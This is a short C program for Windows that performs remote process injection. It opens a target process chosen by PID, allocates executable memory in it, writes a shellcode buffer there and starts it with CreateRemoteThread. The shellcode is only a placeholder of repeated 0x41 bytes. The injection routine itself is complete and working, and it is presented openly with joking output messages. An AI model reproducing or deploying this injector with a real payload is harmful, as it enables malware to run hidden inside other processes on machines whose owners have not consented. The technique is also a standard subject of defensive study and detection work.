#include <stdio.h>
#include <string.h>
#include <Windows.h>
int main(int argc, char* argv[]){
    DWORD pid=0;
    DWORD tid=0;
    HANDLE hprocess,hthread=NULL;
    LPVOID base =NULL;
    unsigned char shellcode[] = "\x41\x41\x41\x41\x41\x41";
       if (argc <2)
    {
        printf("need at least 2 arguments:\t%s\n",argv[0]);
    }
    else{
        pid=atoi(argv[1]);
        hprocess=OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD |PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,pid);
        
        if (hprocess==NULL)
        {
            printf("failed to open process: %ld\t error-code:%ld\n",pid,GetLastError());
            return EXIT_FAILURE;
        }
        printf("process sucessfully opened:%ld\tmemaddrhandle:%p\n",pid,hprocess);
        base = VirtualAllocEx(hprocess,NULL,sizeof(shellcode),(MEM_COMMIT| MEM_RESERVE),PAGE_EXECUTE_READWRITE);
        printf("memmory assigning pid:%ld\tvirtualallocvar:%p\n",pid,base);
        WriteProcessMemory(hprocess,base,shellcode,sizeof(shellcode),NULL);
        printf("sucessfully write in the memmory-_-\n");
        hthread = CreateRemoteThread(hprocess, NULL, 0, (LPTHREAD_START_ROUTINE)base, NULL,0,NULL);
        if (hthread == NULL)
        {
             printf("failed to open process: %ld\t error-code:%ld\n",pid,GetLastError());
             return EXIT_FAILURE;        
        }
        printf("Remote thread created:%ld\tcreated thread:%ld\n",hthread,pid);
        WaitForSingleObject(hthread,INFINITE);
        CloseHandle(hthread);
        CloseHandle(hprocess);
        printf("ohh-yeah");
        return EXIT_SUCCESS;       
        
    }
    return EXIT_SUCCESS;
//welcome to the hell-_-
}